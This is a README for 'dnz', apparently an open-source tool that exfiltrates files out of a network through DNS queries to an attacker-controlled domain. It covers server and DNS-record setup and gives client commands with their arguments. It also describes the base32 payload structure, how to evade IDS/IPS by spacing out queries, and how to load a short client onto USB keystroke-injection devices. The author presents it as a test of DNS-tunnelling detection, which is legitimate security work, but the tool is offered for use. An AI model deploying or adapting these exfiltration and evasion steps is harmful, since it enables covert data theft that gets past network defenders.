#dnz

This should be the last tool to use, as it is slow, but if the only way to get the data out of the network is through DNS (if you can make connection over UDP 53 to external network, use anything else, which will be faster), then this tool is working. The only difference from the tools I have found and tested is introduction of delay between the calls.
*Why would you want that?*
Some IDS/IPS (Intrusion Detection System or Intrusion Prevention Systems) are monitoring frequency of DNS calls to unknown locations, therefore, introducing delay might help to be stealthier.

##How to use
If you know what you are about to do, you should understand that you need to have a control of DNS records and have publicly available server. At this point we will assume that you have that part already done (instructions at part: How to install and configure).
So the usage is simple, on the **"server"** you just need to run (after installing [scapy](https://scapy.net/) for your python):
*python server.py IPtoListenOn DomainName NetworkInterface
python server.py 192.168.0.1 my.domain.com eth0*

Reasons for requirements to provide IP and Network Interface: your server might have multiple, but we do not want to analyse the traffic we do not care about.

If you choose to use the python on the client, then you do not need any additional libraries, standard installation will handle everything and here is the whole beauty. Otherwise there are compiled binaries for Windows (x86), Linux (x86) and OS X (x64), the code which has been compiled is written in GoLang (no judgement here, I am still starting the Go, so trial and error here). Client is simple as well:
*python client.py fileName domain timeToSleep retriesIfNoDNSresponse fileNumberIfMultipleSent
python client.py test.txt my.domain.com 1 2 5*
* fileName - the file name of file you want to transfer
* domain - the domain which you are using (configured)
* timeToSleep - the delay in seconds for between DNS requests, default is 0, (1 in example) increasing the number will slow down the transfer
* retriesIfNoDNSresponse - by default we are expecting to receive DNS response (IP should be 127.0.0.1, additional thing with IPS/IDS they will not be able to check if after the DNS request you have tried a connection), default is set to 2
* fileNumberIfMultipleSent - in case you want to send multiple files, you can set the number of the file, default is set to 1 (5 in example), this is a single digit number!!!

##Limitations
With current design the limitations are the following:
* File should be less than ~240KB
* Up to 9 files can be transferred from machines with same local IP address (chances are low that you will be doing that from two different machines with same IP)
* No encryption, so your file is being transferred over the public network without encryption - you know it's a bad idea
* Not too difficult to run DOS against server after reading the code :)
* If someone is aware of the design, it is possible to corrupt the file in transfer

Probably there are more, but hey, it was PoC.

##How to install and configure
###Server
This is the hardest part, as you need to have server with python, root privileges (listen and respond port 53) and access to control DNS records. Let's start with DNS records.
* Create an A type record for your server, i.e. *m1ns.domain.com IN A x.x.x.x*
* Create NS type record for a short subdomain, i.e. *m.domain.com IN NS m1ns.domain.com*  (as you see your NS server must match the previously created A record, not a rocket science here)
You are done with the DNS records, but check with your provider how to properly set those.

On server Download the server.py from repo, install requirements and run:
* git clone https://github.com/zalt3es/dnz/
* pip install scapy (or pip install requirements.txt)
* python server.py x.x.x.x m.domain.com eth0

That's it, you have a running server.
###Client
Download and run either binary or python. In case you want to transfer less data you can use client2.py, it takes some time to read it, but it's just same code as client.py, just shorter variables, no comments, etc. - should fit even in any key injection USB (Rubber Ducky, etc. probably even in digispark with key injection). In regards to machine permissions, any user, as long as it has access to the file.

##Story behind
This might be boring for some, but interesting to others. I had a need to check how IDS work for DNS tunnelling and data exfiltration over DNS. Multiple publicly available tools has been identified by IDS and blocked, which is not fun in my understanding. Thinking of how IDS and IPS works I have tried to find DNS exfiltration tool which would allow me to use delay between requests, though nothing found in 5 minutes (I might have terrible searching skills :) ). Then I decided that it should not be too difficult to write something like that myself and [scapy](https://scapy.net/) was my tool to go, as python is easy and quick (at least for me).
After analysing how to trap and respond to DNS requests with [scapy](https://scapy.net/), I had another issue, what encoding should be used, it must contain only letters, numbers and hyphen, check [Wikipedia](https://en.wikipedia.org/wiki/Hostname), so BASE64 falls down, as it is case sensitive. Luckily, I don't have to invent the wheel, python has BASE32 encoding as default encoding type, which is not case sensitive, and even uses less characters than I need.
Another thing which was considered, what information I want to have and the way payload needs to organised, so came up with this payload structure:
hhhhhhhhAXXXXpppppppppp
* hhhhhhhh - IP of originating machine in hex to save space, could be even smaller
* A       - File number (in case you want to run multiple files from the machine - this would increase the noise)
* XXXX    - packet number, this is a numeric value, that's where the limitation for file size comes from, file must be sent in less than 10.000 requests
* pppppppp - the part of file, or filename if that is the first request

As expected, creating custom tool and introducing delays, got the file out without triggering alerts, though logic behind rules has been changed and analysis and correlation between other machines on the network helped a lot. Rules can be changed to identify the tools, but new tool is always hard to identify. Since such a simple tool was not identified during the test on quite isolated network, logic says that if you really need to use DNS, then take the server.py and create your own structure which would be beneficial for you (i.e. if you need to transfer only digits, then there is no reason to BASE32 encode, just encode to hex, or even better, create your own simple encoding utilising all alphabet characters and digits - 36 characters, so number up to 3656.1584.4006.2976 should fit in 10 characters).

Enjoy!

##Disclaimer

All the information on here is published in good faith and for general information purpose only. I do not make any warranties about the completeness, reliability and accuracy of this information. Any action you take upon the information (including code) you find in this repo, is strictly at your own risk. I will not be liable for any losses and/or damages in connection with the use of the tool, code, information, etc. on this repo. I am not responsible for misuse of tools and information, as well, this tool shoul not be used for illegal purposes.
